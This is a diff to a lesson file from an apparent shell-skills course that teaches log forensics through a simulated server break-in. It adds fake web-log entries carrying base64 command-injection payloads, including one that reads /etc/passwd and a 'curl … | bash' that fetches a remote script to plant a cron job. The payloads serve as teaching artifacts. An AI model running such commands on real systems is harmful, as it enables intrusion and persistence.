@@ -27,8 +27,23 @@ const BREACH_WEB = [
   webHit('198.51.100.23', mar(14, 0, 24, 58), 'GET', '/portal/logout', 302, 0),
 ];
 
-/** web01's access log from Friday evening to Saturday noon, with the attacker's portal visit in it. */
-export const WEB01_ACCESS_LOG = accessLog({ seed: 17, start: mar(13, 20, 0, 0), end: mar(14, 12, 0, 0), normal: 160, extra: BREACH_WEB });
+/**
+ * In the same minutes, a script on the same address drove the forgotten /cgi-bin/diag.cgi with base64 in cmd=
+ * (Case 4 decodes these). Only artifacts: every payload is encoded without a trailing newline and never executed.
+ */
+const UA_SCRIPT = 'python-requests/2.31.0';
+const diag = (t: number, query: string, status: number, size: number) => webHit('198.51.100.23', t, 'GET', `/cgi-bin/diag.cgi${query}`, status, size, UA_SCRIPT);
+const DIAG_WEB = [
+  diag(mar(13, 23, 57, 52), '', 200, 341), // the bare page: recon, no payload
+  diag(mar(13, 23, 58, 23), '?cmd=aWQ=', 200, 52), // id
+  diag(mar(13, 23, 58, 51), '?cmd=dW5hbWUgLWE=', 200, 118), // uname -a
+  diag(mar(14, 0, 2, 41), '?cmd=Y2F0IC9ldGMvcGFzc3dk', 200, 1873), // cat /etc/passwd
+  diag(mar(14, 0, 12, 20), '?cmd=..%2f..%2fetc%2fpasswd', 500, 612), // path traversal, not base64
+  diag(mar(14, 0, 30, 17), '?cmd=Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC43Ny91LnNoIHwgYmFzaA==&t=1', 200, 0), // curl … | bash: plants the cron job
+];
+
+/** web01's access log from Friday evening to Saturday noon: the attacker's portal visit and its diag.cgi commands. */
+export const WEB01_ACCESS_LOG = accessLog({ seed: 17, start: mar(13, 20, 0, 0), end: mar(14, 12, 0, 0), normal: 160, extra: [...BREACH_WEB, ...DIAG_WEB] });
 
 /** The customer portal's own log (ISO timestamps). */
 const APP_LOG = `2026-03-12 16:02:37 INFO portal: user raj logged in from 10.20.0.12
@@ -66,6 +81,12 @@ const SSH_LOOP = `grep "198.51.100.23 " /var/log/auth.log | tail -4 |
 while read -r mon day clock rest; do
   echo "$(date -d "$mon $day $clock 2026" '+%F %T') \${rest#*: }"
 done > ~/evidence/ssh.txt`;
+/** What SSH_LOOP writes into ~/evidence/ssh.txt. */
+const SSH_TXT = `2026-03-13 23:45:43 Failed password for invalid user admin from 198.51.100.23 port 33635 ssh2
+2026-03-13 23:47:09 Failed password for root from 198.51.100.23 port 45149 ssh2
+2026-03-13 23:48:36 Failed password for raj from 198.51.100.23 port 39390 ssh2
+2026-03-13 23:51:00 Accepted password for raj from 198.51.100.23 port 39615 ssh2
+`;
 const WINDOW = `awk '$0 >= "2026-03-13 23:50" && $0 < "2026-03-14 00:30"'`;
 
 export const day17: Mission = {
@@ -144,7 +165,7 @@ In an \`auth.log\` line, the stamp is the first three fields: \`awk '{print $1, 
       kind: 'task',
       id: 'syslog-iso',
       md: 'Save the stamp of the `Accepted password` line in `/var/log/auth.log` in a variable `stamp`, then print it in ISO, with the year added.',
-      check: { output: '2026-03-13 23:51:00\n', uses: ['date'] },
+      check: { output: '2026-03-13 23:51:00\n', uses: ['date'], vars: { stamp: 'Mar 13 23:51:00' } },
       solution: `stamp=$(grep "Accepted password" /var/log/auth.log | awk '{print $1, $2, $3}'); date -d "$stamp 2026" '+%F %T'`,
       hints: ['Two steps: capture the stamp with `$( )`, then hand it to `date -d`.', `\`stamp=$(grep "Accepted password" /var/log/auth.log | awk '{print $1, $2, $3}')\``, `Then \`date -d "$stamp 2026" '+%F %T'\`.`],
       explain: 'One syslog line in, one ISO stamp out. Run the same conversion in a loop over every line of a log and you have half of Case 5.',
@@ -186,7 +207,7 @@ The \`+0000\` sits in field 5, and you can leave it there: it says these servers
       kind: 'task',
       id: 'apache-iso',
       md: 'Now on the real log. Take the **first** request from `198.51.100.23` in `/var/log/apache2/access.log`, put its field 4 in `s`, make the three cuts and print the time in ISO.',
-      check: { output: '2026-03-13 23:52:40\n', uses: ['date'] },
+      check: { output: '2026-03-13 23:52:40\n', uses: ['date'], vars: { s: '13 Mar 2026 23:52:40' } },
       solution: `s=$(grep "^198.51.100.23 " /var/log/apache2/access.log | head -1 | awk '{print $4}'); s=\${s:1}; s=\${s/:/ }; s=\${s//\\// }; date -d "$s" '+%F %T'`,
       hints: [
         `\`s=$(grep "^198.51.100.23 " /var/log/apache2/access.log | head -1 | awk '{print $4}')\``,
@@ -248,10 +269,10 @@ A shorter bound works like a prefix: every line from 23:50:00 on is \`>= "2026-0
 ${SSH_LOOP}
 \`\`\`
 
-Run it, then \`cat ~/evidence/ssh.txt\`.`,
-      check: { output: 'reference', fs: [{ path: '~/evidence/ssh.txt', contains: '2026-03-13 23:51:00 Accepted password for raj from 198.51.100.23' }] },
+Run it. It prints nothing, because \`>\` sends the loop’s output into the file. Then \`cat ~/evidence/ssh.txt\` to read it.`,
+      check: { fs: [{ path: '~/evidence/ssh.txt', content: SSH_TXT }] },
       solution: `${SSH_LOOP}\ncat ~/evidence/ssh.txt`,
-      hints: ['Type the loop as shown. The terminal waits for `done` before it runs anything.', 'Then `cat ~/evidence/ssh.txt`.'],
+      hints: ['Type the loop as shown. The terminal waits for `done` before it runs anything.', 'The loop writes into the file, so the screen stays empty. `cat ~/evidence/ssh.txt` shows what it wrote.'],
       explain: 'Four auth.log lines, now on the same clock as the portal log. The last one is the moment it all went wrong: `23:51:00 Accepted password for raj`.',
     },
     {
@@ -261,7 +282,7 @@ Run it, then \`cat ~/evidence/ssh.txt\`.`,
       check: { output: 'reference', uses: ['sort'] },
       solution: `{ cat ~/evidence/ssh.txt; grep "user raj" ~/evidence/app.log; } | sort | awk '$0 >= "2026-03-13 23:45" && $0 < "2026-03-14 00:30"'`,
       hints: ['`{ cat ~/evidence/ssh.txt; grep "user raj" ~/evidence/app.log; } | sort`', `Then the window: \`| awk '$0 >= "2026-03-13 23:45" && $0 < "2026-03-14 00:30"'\`.`],
-      explain: 'Eleven lines, and the whole night reads like a story: three failures, the SSH login at 23:51:00, the portal login two minutes later with the same stolen password, the customer export at 23:55, two refused admin pages, a second export, a refused API-keys page, and logout at 00:24:58. Case 5 does this for every line of both logs, automatically.',
+      explain: 'Eleven lines, and the portal’s side of the night reads like a story: three failures, the SSH login at 23:51:00, the portal login two minutes later with the same stolen password, the customer export at 23:55, two refused admin pages, a second export, a refused API-keys page, and logout at 00:24:58. The portal never saw the rest. The access log also holds the `diag.cgi` requests from Case 4, ending at 00:30:17 with the `curl … | bash` that planted the root cron job. Case 5 merges every SSH line and every web request, automatically.',
     },
     {
       kind: 'fill',
@@ -285,11 +306,11 @@ Run it, then \`cat ~/evidence/ssh.txt\`.`,
     {
       kind: 'task',
       id: 'd-onsite',
-      md: '**Drill 2.** How long was the attacker on the portal? Its first web request was stamped `[13/Mar/2026:23:52:40` and its last `[14/Mar/2026:00:24:58`. Print the whole minutes between them.',
-      check: { output: '32\n', nodes: ['arith'] },
-      solution: 'a=$(date -d "13 Mar 2026 23:52:40" +%s); b=$(date -d "14 Mar 2026 00:24:58" +%s); echo $(( (b - a) / 60 ))',
+      md: '**Drill 2.** How long was the attacker busy on web01’s website? Its first web request was stamped `[13/Mar/2026:23:52:40` and its last `[14/Mar/2026:00:30:17`. Print the whole minutes between them.',
+      check: { output: '37\n', nodes: ['arith'] },
+      solution: 'a=$(date -d "13 Mar 2026 23:52:40" +%s); b=$(date -d "14 Mar 2026 00:30:17" +%s); echo $(( (b - a) / 60 ))',
       hints: ['Rewrite both stamps in a form `date` accepts: `13 Mar 2026 23:52:40`.', 'Epoch seconds for both, then `echo $(( (b - a) / 60 ))`.'],
-      explain: '32 minutes, across midnight. Try it with the clock times as text and `00:24` minus `23:52` comes out negative. Epoch seconds don’t care what day it is.',
+      explain: '37 minutes, across midnight, from the portal’s login page to the request that planted the cron job. Try it with the clock times as text and `00:30` minus `23:52` comes out negative. Epoch seconds don’t care what day it is.',
     },
     {
       kind: 'task',
@@ -302,7 +323,7 @@ Run it, then \`cat ~/evidence/ssh.txt\`.`,
         'Loop with `while read -r s path; do …; done` and make the three cuts on `s`.',
         `Once \`s\` is fixed: \`echo "$(date -d "$s" '+%F %T') $path"\`.`,
       ],
-      explain: 'Admin pages, user management, API keys: the attacker went looking for more power and a way back in. All three were refused. Note `/portal/settings/api-keys` in the report anyway: had it worked, resetting Raj’s password would not have locked them out.',
+      explain: 'Admin pages, user management, API keys: the attacker went looking for more power and a way back in. All three were refused, and it didn’t matter. In the same minutes, the same address was sending commands through `/cgi-bin/diag.cgi` (Case 4), and the last of them planted the root cron job that outlived Raj’s password reset. Note `/portal/settings/api-keys` in the report anyway: a stolen API key would have been one more way back in.',
     },
     {
       kind: 'task',
@@ -316,7 +337,7 @@ Run it, then \`cat ~/evidence/ssh.txt\`.`,
   ],
   debrief: {
     summary: [
-      '`date +%s` is now in epoch seconds. `date -d "2026-03-13 23:51:00" +%s` converts a moment, and `date -u -d @EPOCH \'+%F %T\'` converts back.',
+      '`date +%s` prints the current time in epoch seconds. `date -d "2026-03-13 23:51:00" +%s` converts a given moment, and `date -u -d @EPOCH \'+%F %T\'` converts back.',
       'Syslog stamps have no year, so add it: `"Mar 13 23:51:00 2026"`. Apache stamps need three cuts first: `${s:1}`, `${s/:/ }`, `${s//\\// }`.',
       'A gap is a subtraction of epoch seconds: `$(( (b - a) / 60 ))` minutes, even across midnight.',
       'ISO stamps sort and compare correctly as text: `sort` for order, `awk \'$0 >= "…" && $0 < "…"\'` for a window.',
